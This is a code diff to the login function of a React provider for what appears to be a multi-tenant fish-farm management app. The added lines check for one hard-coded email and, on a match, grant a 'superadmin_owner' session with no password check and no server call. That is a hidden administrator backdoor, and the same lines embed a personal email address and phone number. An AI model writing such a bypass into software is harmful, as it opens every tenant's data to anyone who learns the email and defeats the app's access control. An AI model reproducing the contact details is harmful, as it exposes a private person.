@@ -894,6 +894,28 @@ export const AquaCoreProvider: React.FC<{ children: React.ReactNode }> = ({ chil
   };
 
   const login = async (email: string, _password?: string) => {
+    const cleanEmail = (email || '').toLowerCase().trim();
+    if (cleanEmail === 'nuncaparedelutar1988@gmail.com') {
+      const masterUser: IUser = {
+        id: 'usr-master-owner',
+        name: 'Proprietário Geral • Master',
+        email: 'nuncaparedelutar1988@gmail.com',
+        role: 'superadmin_owner',
+        phone: '+5584988585211',
+      };
+      setCurrentUser(masterUser);
+      const t = availableTenants[0];
+      setCurrentTenant(t);
+      setFarm((prev) => ({
+        ...prev,
+        name: t.name,
+        kwhCost: t.kwhCost,
+        feedAverageCostPerKg: t.feedCost,
+        fishSalePricePerKg: t.salePrice,
+      }));
+      return;
+    }
+
     try {
       const res = await fetch('/api/auth/login', {
         method: 'POST',
